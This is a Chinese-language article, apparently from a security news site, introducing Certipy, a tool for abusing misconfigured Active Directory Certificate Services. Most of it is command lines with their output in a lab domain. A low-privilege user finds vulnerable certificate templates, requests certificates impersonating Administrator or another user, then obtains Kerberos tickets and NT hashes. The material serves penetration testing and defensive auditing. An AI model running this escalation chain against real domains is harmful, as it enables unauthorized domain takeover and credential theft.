@@ -1,0 +1,469 @@
+![](https://image.3001.net/images/20220101/1641003709_61cfbabd6da16093d07b1.png!small)
+
+## 关于Certipy
+
+Certipy是一款基于Python开发的强大工具，该工具可以帮助广大研究人员枚举并利用活动目录证书服务（AD CS）中的错误配置项。
+
+## 工具安装
+
+广大研究人员可以使用下列命令将该项目源码克隆至本地：
+
+    
+    
+    git clone https://github.com/ly4k/Certipy.git
+
+接下来，在命令行终端中切换至项目根目录，然后运行下列命令即可：
+
+    
+    
+    $ python3 setup.py install
+
+别忘了将Python脚本目录添加至系统环境变量路径中。
+
+## 工具使用
+
+    
+    
+    $ certipy -h
+    
+    usage: certipy [-h] [-debug] [-target-ip ip address] [-nameserver nameserver] [-dns-tcp] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-dc-ip ip address]
+    
+                   target {find,req,auth,auto} ...
+    
+     
+    
+    Active Directory certificate abuse
+    
+     
+    
+    positional arguments:
+    
+      target                [[域名/]用户名[:密码]@]<目标名称或地址>
+    
+      {find,req,auth,auto}  操作
+    
+        find                查找证书模板
+    
+        req                 请求一份新的证书
+    
+        auth                使用证书进行认证
+    
+        auto                自动利用证书实现提权
+    
+     
+    
+    optional arguments:
+    
+      -h, --help              显示帮助信息
+    
+      -debug                开启调试模式输出
+    
+      -no-pass              不询问密码
+    
+      -k                    使用Kerberos认证。
+    
+      -dc-ip ip address        目标域控制器的IP地址
+    
+     
+    
+    connection:
+    
+      -target-ip ip address
+    
+                            目标设备的IP地址
+    
+      -nameserver nameserver  用于DNS解析的域名服务器
+    
+      -dns-tcp               使用TCP代替UDP执行DNS查询
+    
+     
+    
+    authentication:
+    
+      -hashes LMHASH:NTHASH
+    
+                            NTLM hashes, format is LMHASH:NTHASH
+
+## 工具使用样例
+
+### 自动化
+
+在下面的使用样例中，用户john是一个低权限用户，可以注册Copy of Web Server模板：
+
+    
+    
+    $ certipy 'predator/john:Passw0rd@dc.predator.local' auto
+    
+    [*] Trying template 'Copy of Web Server' with CA 'predator-DC-CA'
+    
+    [*] Generating RSA key
+    
+    [*] Requesting certificate
+    
+    [*] Request success
+    
+    [*] Got certificate with UPN 'Administrator'
+    
+    [*] Saved certificate to '1.crt'
+    
+    [*] Saved private key to '1.key'
+    
+    [*] Using UPN: 'Administrator@predator'
+    
+    [*] Trying to get TGT...
+    
+    [*] Saved credential cache to 'Administrator.ccache'
+    
+    [*] Trying to retrieve NT hash for 'Administrator@predator'
+    
+    [*] Got NT hash for 'Administrator@predator': fc525c9683e8fe067095ba2ddc971889
+
+默认情况下，工具会选择Administrator用户，我们也可以使用-user参数来为其他用户创建证书。
+
+### 查找
+
+find操作将帮助我们查找一个或多个CA启用了的证书模板。
+
+ **查找漏洞模板**
+
+使用-vulnerable参数将搜索存在漏洞的证书模板：
+
+    
+    
+    $ certipy 'predator/john:Passw0rd@dc.predator.local' find -vulnerable
+    
+    [*] Finding vulnerable certificate templates for 'john'
+    
+    User
+    
+      Name                                  : predator\john
+    
+      Groups                                :
+    
+    Certificate Authorities
+    
+      0
+    
+        CA Name                             : predator-DC-CA
+    
+        DNS Name                            : dc.predator.local
+    
+        Certificate Subject                 : CN=predator-DC-CA, DC=predator, DC=local
+    
+        Certificate Serial Number           : 1976D0FEFCAFC9A84D02D305FA88D84D
+    
+        Certificate Validity Start          : 2021-10-06 11:32:01+00:00
+    
+        Certificate Validity End            : 2026-10-06 11:42:01+00:00
+    
+        User Specified SAN                  : Disabled
+    
+        CA Permissions
+    
+          Owner                             : BUILTIN\Administrator
+    
+          Access Rights
+    
+            ManageCertificates              : BUILTIN\Administrator
+    
+                                              predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            ManageCa                        : BUILTIN\Administrator
+    
+                                              predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            Enroll                          : Authenticated Users
+    
+    Vulnerable Certificate Templates
+    
+      0
+    
+        CAs                                 : predator-DC-CA
+    
+        Template Name                       : Copy of Web Server
+    
+        Validity Period                     : 2 years
+    
+        Renewal Period                      : 6 weeks
+    
+        Certificate Name Flag               : EnrolleeSuppliesSubject
+    
+        Enrollment Flag                     : None
+    
+        Authorized Signatures Required      : 0
+    
+        Extended Key Usage                  :
+    
+        Permissions
+    
+          Enrollment Permissions
+    
+            Enrollment Rights               : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              Authenticated Users
+    
+          Object Control Permissions
+    
+            Owner                           : predator\Administrator
+    
+            Write Owner Principals          : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+    
+            Write Dacl Principals           : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+    
+            Write Property Principals       : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+    
+        Vulnerable Reasons                  : 'Authenticated Users' can enroll, enrollee supplies subject and template allows authentication
+    
+                                              'Authenticated Users' can enroll and template has dangerous EKU
+
+使用-user参数将查找指定用户相关的存在漏洞的证书模板，默认配置下使用的是当前用户。
+
+ **查找所有模板**
+
+    
+    
+    $ certipy 'predator/john:Passw0rd@dc.predator.local' find
+    
+    [*] Finding certificate templates for 'john'
+    
+    User
+    
+      Name                                  : predator\john
+    
+      Groups                                :
+    
+    Certificate Authorities
+    
+      0
+    
+        CA Name                             : predator-DC-CA
+    
+        DNS Name                            : dc.predator.local
+    
+        Certificate Subject                 : CN=predator-DC-CA, DC=predator, DC=local
+    
+        Certificate Serial Number           : 1976D0FEFCAFC9A84D02D305FA88D84D
+    
+        Certificate Validity Start          : 2021-10-06 11:32:01+00:00
+    
+        Certificate Validity End            : 2026-10-06 11:42:01+00:00
+    
+        User Specified SAN                  : Disabled
+    
+        CA Permissions
+    
+          Owner                             : BUILTIN\Administrator
+    
+          Access Rights
+    
+            ManageCertificates              : BUILTIN\Administrator
+    
+                                              predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            ManageCa                        : BUILTIN\Administrator
+    
+                                              predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            Enroll                          : Authenticated Users
+    
+    Certificate Templates
+    
+      0
+    
+        CAs                                 : predator-DC-CA
+    
+        Template Name                       : User
+    
+        Validity Period                     : 1 year
+    
+        Renewal Period                      : 6 weeks
+    
+        Certificate Name Flag               : SubjectRequireDirectoryPath
+    
+                                              SubjectRequireEmail
+    
+                                              SubjectAltRequireEmail
+    
+                                              SubjectAltRequireUpn
+    
+        Enrollment Flag                     : AutoEnrollment
+    
+                                              PublishToDs
+    
+                                              IncludeSymmetricAlgorithms
+    
+        Authorized Signatures Required      : 0
+    
+        Extended Key Usage                  : Encrypting File System
+    
+                                              Secure Email
+    
+                                              Client Authentication
+    
+        Permissions
+    
+          Enrollment Permissions
+    
+            Enrollment Rights               : predator\Domain Admins
+    
+                                              predator\Domain Users
+    
+                                              predator\Enterprise Admins
+    
+          Object Control Permissions
+    
+            Owner                           : predator\Enterprise Admins
+    
+            Write Owner Principals          : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            Write Dacl Principals           : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+            Write Property Principals       : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+    [...]
+    
+      11
+    
+        CAs                                 : predator-DC-CA
+    
+        Template Name                       : Copy of Web Server
+    
+        Validity Period                     : 2 years
+    
+        Renewal Period                      : 6 weeks
+    
+        Certificate Name Flag               : EnrolleeSuppliesSubject
+    
+        Enrollment Flag                     : None
+    
+        Authorized Signatures Required      : 0
+    
+        Extended Key Usage                  :
+    
+        Permissions
+    
+          Enrollment Permissions
+    
+            Enrollment Rights               : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              Authenticated Users
+    
+          Object Control Permissions
+    
+            Owner                           : predator\Administrator
+    
+            Write Owner Principals          : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+    
+            Write Dacl Principals           : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+    
+            Write Property Principals       : predator\Domain Admins
+    
+                                              predator\Enterprise Admins
+    
+                                              predator\Administrator
+
+### 查询请求
+
+用户josh将会以用户jane的身份请求一个有效的身份认证证书，predator-DC-CA已启用了Copy of Web Server：
+
+    
+    
+    $ certipy 'predator/john:Passw0rd@dc.predator.local' req -template 'Copy of Web Server' -ca 'predator-DC-CA' -alt 'jane'
+    
+    [*] Generating RSA key
+    
+    [*] Requesting certificate
+    
+    [*] Request success
+    
+    [*] Got certificate with UPN 'jane'
+    
+    [*] Saved certificate to '2.crt'
+    
+    [*] Saved private key to '2.key'
+
+ **以当前用户身份请求证书**
+
+    
+    
+    $ certipy 'predator/john:Passw0rd@dc.predator.local' req -template 'User' -ca 'predator-DC-CA'
+    
+    [*] Generating RSA key
+    
+    [*] Requesting certificate
+    
+    [*] Request success
+    
+    [*] Got certificate with UPN 'john@predator.local'
+    
+    [*] Saved certificate to '3.crt'
+    
+    [*] Saved private key to '3.key'
+
+### 身份认证
+
+auth操作将会使用PKINIT Kerberos扩展来对提供的证书进行身份认证：
+
+    
+    
+    $ certipy 'predator/jane@dc.predator.local' auth -cert ./2.crt -key ./2.key
+    
+    [*] Using UPN: 'jane@predator'
+    
+    [*] Trying to get TGT...
+    
+    [*] Saved credential cache to 'jane.ccache'
+    
+    [*] Trying to retrieve NT hash for 'jane@predator'
+    
+    [*] Got NT hash for 'jane@predator': 077cccc23f8ab7031726a3b70c694a49
+
+## 项目地址
+
+ **Certipy：** 【[ _GitHub传送门_](https://github.com/ly4k/Certipy)】
+
+## 参考资料
+
+> [ _https://www.specterops.io/assets/resources/Certified_Pre-> Owned.pdf_](https://www.specterops.io/assets/resources/Certified_Pre-> Owned.pdf)
+>
+> [
+> _https://github.com/dirkjanm/PKINITtools_](https://github.com/dirkjanm/PKINITtools)
+
